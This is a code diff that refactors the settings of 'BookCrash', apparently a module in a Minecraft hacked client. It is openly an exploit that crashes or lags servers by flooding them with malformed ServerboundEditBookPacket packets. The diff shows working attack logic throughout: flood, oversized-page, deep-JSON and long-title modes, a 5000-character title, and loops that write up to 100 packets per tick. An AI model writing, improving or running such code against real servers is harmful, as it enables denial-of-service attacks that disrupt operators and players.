@@ -2,16 +2,15 @@ package com.tricrotism.modules.crash;
 
 import com.tricrotism.SageFang;
 import com.tricrotism.api.eventbus.EventHandler;
-import com.tricrotism.api.menus.Menu;
+import com.tricrotism.api.modules.Category;
 import com.tricrotism.api.modules.Module;
+import com.tricrotism.api.settings.Settings;
 import com.tricrotism.events.game.GameQuitEvent;
 import com.tricrotism.events.world.TickEvent;
 import com.tricrotism.mixin.accessors.ConnectionAccessor;
 import imgui.ImGui;
 import imgui.ImGuiIO;
 import imgui.flag.ImGuiWindowFlags;
-import imgui.type.ImInt;
-import io.avaje.config.Config;
 import io.netty.channel.Channel;
 import net.minecraft.client.Minecraft;
 import net.minecraft.network.Connection;
@@ -22,22 +21,30 @@ import java.util.List;
 import java.util.Optional;
 
 /**
- * Book crash exploit — abuses ServerboundEditBookPacket to trigger various
+ * Book crash exploit. Abuses ServerboundEditBookPacket to trigger various
  * server-side book validation failures (LPX checks BOOK_A, BOOK_B, PAYLOAD_B, ITEM).
  * <p>
  * Modes:
  * <ul>
- *   <li><b>Flood</b> — blast many book packets per tick to stall netty threads</li>
- *   <li><b>Large Pages</b> — pages filled with maximum text to exceed per-item byte limits</li>
- *   <li><b>Deep JSON</b> — pages with deeply nested text components to exceed component limits</li>
- *   <li><b>Long Title</b> — book title exceeding max length</li>
+ *   <li><b>Flood</b>: blast many book packets per tick to stall netty threads</li>
+ *   <li><b>Large Pages</b>: pages filled with maximum text to exceed per-item byte limits</li>
+ *   <li><b>Deep JSON</b>: pages with deeply nested text components to exceed component limits</li>
+ *   <li><b>Long Title</b>: book title exceeding max length</li>
  * </ul>
  */
-public class BookCrash extends Module implements Menu {
+public class BookCrash extends Module {
 
     public static final BookCrash instance = new BookCrash();
 
-    private static final String[] MODE_LABELS = {"Flood", "Large Pages", "Deep JSON", "Long Title"};
+    private final Settings.Mode mode =
+        mode("Mode", "mode", "Book crash variant", 0, "Flood", "Large Pages", "Deep JSON", "Long Title");
+    private final Settings.Int speed =
+        integer("Packets/tick", "speed", "Book packets per tick", 20, 1, 100);
+    private final Settings.Int pageCount =
+        integer("Page Count", "pageCount", "Pages per book", 100, 1, 100);
+    private final Settings.Int pageSize =
+        integer("Page Size", "pageSize", "Characters per page", 32000, 1, 32767);
+
     private static final int MODE_FLOOD = 0;
     private static final int MODE_LARGE_PAGES = 1;
     private static final int MODE_DEEP_JSON = 2;
@@ -52,52 +59,13 @@ public class BookCrash extends Module implements Menu {
     private int cachedPageSize = -1;
 
     public BookCrash() {
-        super("bookcrash", "Book Crash", "Exploit book packet vulnerabilities to crash or lag servers.", "Combat");
-    }
-
-    private int mode() {
-        return Config.getInt(baseConfig + ".mode", MODE_FLOOD);
-    }
-
-    private void setMode(int v) {
-        Config.setProperty(baseConfig + ".mode", String.valueOf(v));
-        invalidateCache();
-    }
-
-    private int speed() {
-        return Config.getInt(baseConfig + ".speed", 20);
-    }
-
-    private void setSpeed(int v) {
-        Config.setProperty(baseConfig + ".speed", String.valueOf(v));
-    }
-
-    private int pageCount() {
-        return Config.getInt(baseConfig + ".pageCount", 100);
-    }
-
-    private void setPageCount(int v) {
-        Config.setProperty(baseConfig + ".pageCount", String.valueOf(v));
-        invalidateCache();
-    }
-
-    private int pageSize() {
-        return Config.getInt(baseConfig + ".pageSize", 32000);
-    }
-
-    private void setPageSize(int v) {
-        Config.setProperty(baseConfig + ".pageSize", String.valueOf(v));
-        invalidateCache();
-    }
-
-    private void invalidateCache() {
-        cachedPages = null;
+        super("bookcrash", "Book Crash", "Exploit book packet vulnerabilities to crash or lag servers.", Category.COMBAT);
     }
 
     private List<String> getPages() {
-        int m = mode();
-        int pc = pageCount();
-        int ps = pageSize();
+        int m = mode.get();
+        int pc = pageCount.get();
+        int ps = pageSize.get();
         if (cachedPages != null && m == cachedMode && pc == cachedPageCount && ps == cachedPageSize) {
             return cachedPages;
         }
@@ -146,7 +114,7 @@ public class BookCrash extends Module implements Menu {
     }
 
     private Optional<String> getTitle() {
-        if (mode() == MODE_LONG_TITLE) {
+        if (mode.get() == MODE_LONG_TITLE) {
             return Optional.of("A".repeat(5000));
         }
         return Optional.empty();
@@ -167,7 +135,7 @@ public class BookCrash extends Module implements Menu {
         List<String> pages = getPages();
         Optional<String> title = getTitle();
 
-        int count = speed();
+        int count = speed.get();
         for (int i = 0; i < count; i++) {
             channel.write(new ServerboundEditBookPacket(slot, pages, title));
         }
@@ -196,32 +164,29 @@ public class BookCrash extends Module implements Menu {
             ImGui.separator();
 
             // Mode combo
-            ImInt modeInt = new ImInt(mode());
-            if (ImGui.combo("Mode##bcMode", modeInt, MODE_LABELS)) {
-                setMode(modeInt.get());
-            }
+            mode.render();
 
             // Speed slider
-            int[] speedArr = {speed()};
+            int[] speedArr = {speed.get()};
             if (ImGui.sliderInt("Packets/tick##bcSpeed", speedArr, 1, 100)) {
-                setSpeed(speedArr[0]);
+                speed.set(speedArr[0]);
             }
 
-            int m = mode();
+            int m = mode.get();
 
             // Page Count slider (relevant for all modes)
             if (m != MODE_LONG_TITLE) {
-                int[] pcArr = {pageCount()};
+                int[] pcArr = {pageCount.get()};
                 if (ImGui.sliderInt("Page Count##bcPageCount", pcArr, 1, 100)) {
-                    setPageCount(pcArr[0]);
+                    pageCount.set(pcArr[0]);
                 }
             }
 
             // Page Size slider (relevant for Flood, Large Pages, Long Title)
             if (m != MODE_DEEP_JSON) {
-                int[] psArr = {pageSize()};
+                int[] psArr = {pageSize.get()};
                 if (ImGui.sliderInt("Page Size##bcPageSize", psArr, 1, 32767)) {
-                    setPageSize(psArr[0]);
+                    pageSize.set(psArr[0]);
                 }
             }
 
